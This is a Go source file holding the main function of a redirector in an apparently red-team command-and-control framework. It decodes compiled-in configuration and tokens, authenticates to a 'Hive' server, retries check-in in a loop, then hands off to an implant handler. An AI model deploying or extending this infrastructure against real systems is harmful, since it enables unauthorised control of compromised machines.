//{{{{{{{ Redirector Main Function }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project


package main

import (
	"strings"
	"os"
	"encoding/json"
	"bytes"
	"time"
	"fmt"
	"sync"
)

/*
JSON Structures for Compiling Redirectors and Implants (Bichito)
These JSON structure will be passed to the go compiling process to provide most of the configurations related to which modules are active.
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/

//Compiling-time JSON-Encoded Configurations for Redirector
type RedConfig struct {
    Roaster string   `json:"roaster"`
    HiveFingenprint   string `json:"hivefingenprint"`
    Token string `json:"token"`
    BiToken string `json:"bitoken"`
    Saas string   `json:"saas"`
    Offline string   `json:"offline"`
    Coms string   `json:"coms"`
}

type RedAuth struct {
    Domain string   `json:"domain"`
    Token string  `json:"token"`  
}


/*
This JSON Object definition is needed in the redirector to wrap within Jobs the RID of the redirector (same definition)
Hive will have the same definitions in: ./src/hive/hiveDB.go
*/
type Job struct {
    Cid  string   `json:"cid"`              // The client CID triggered the job
    Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
    Pid string   `json:"pid"`               // Parent Id, when the job came completed from a Implant, Pid is the Redirector where it cames from
    Chid string `json:"chid"`               // Implant Id
    Job string   `json:"job"`               // Job Name
    Time  string   `json:"time"`            // Time of creation
    Status  string   `json:"status"`        // Sent - Processing - Finished
    Result  string   `json:"result"`        // Job output data
    Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
}


//Redirector "on-memory" Job slices to manage Jobs that are being sent to Hive, or to an Implant
type JobsToHive struct {
	mux  sync.RWMutex
	Jobs []*Job
}

type JobsToBichito struct {
	mux  sync.RWMutex
	Jobs []*Job
}

type lockObject struct {
    mux  sync.RWMutex
    Lock int
}

var lock *lockObject


//On Compile variables:
/*
    parameters --> JSON Encoded String with all Redirector and Network Module data
    redconfig   --> JSON Object where parameters will be decoded to
    authbearer --> Redirector JSON Object Credentials for the header
    rid --> Redirector RID
    jobsToHive --> Jobs to Hive on memory slice
    jobsToBichito --> Jobs to Implants on memory slice
*/
var(
	parameters string
	redconfig *RedConfig 
	authbearer string
	rid string

	jobsToHive	*JobsToHive
	jobsToBichito *JobsToBichito
)

/*
Description: Redirector Main Function
Flow:
A.Decode On compiled JSON string with redirector configurations
B.Get the Server Hostname.
	B1. If the redirector is a SaaS//Offline, the hostname need to be pre-set
C.Encode the Authenthication Header for login to Hive
D.Initialize the "on-memory" Slices for the Jobs to be sent to Hive or to be sent to Implants connected
E.Start the checking routine against hive to fet the RID
F.Once the check-in is completed, start the target "network module" handler to receive/query Implants connections. The Function to
  execute will depend of the network module selected.
*/
func main() {

	//Decode Redirector Parameters
	errDaws := json.Unmarshal([]byte(parameters),&redconfig)
	//Create authbearer for redirector checking and authorization process with Hive
	hostname,errorH := os.Hostname()
	if (errorH != nil) || (errDaws != nil){
		//This should create error logs, but have not even made checking yet
		fmt.Println("Error on parameters JSon decoding or getting hostname\n")
	}

	if redconfig.Saas != ""{
		hostname = redconfig.Saas
	}else if redconfig.Offline != ""{
		hostname = redconfig.Offline
	}



	authbearerO := RedAuth{hostname,redconfig.Token}
	bufRP := new(bytes.Buffer)
	json.NewEncoder(bufRP).Encode(authbearerO)
	resultRP := bufRP.String()
	authbearer = resultRP 
	authbearer = strings.TrimSuffix(authbearer, "\n")

	//Initialize on memory slices for redirect Jobs
	var jobs []*Job
	jobsToHive	= &JobsToHive{Jobs:jobs}
	jobsToBichito = &JobsToBichito{Jobs:jobs}
	lock = &lockObject{Lock:0}

	// Keep pinging Hive each 5 seconds till checking is done
	for{
		rid = checking()
		if strings.Contains(rid,"R-"){
			break
		}
		fmt.Println("Checking failed:"+rid)
		time.Sleep(5 * time.Second)
	}

	//Once hive cheking is performed, start the network module handler (will change between modules)
	bichitoHandler()
}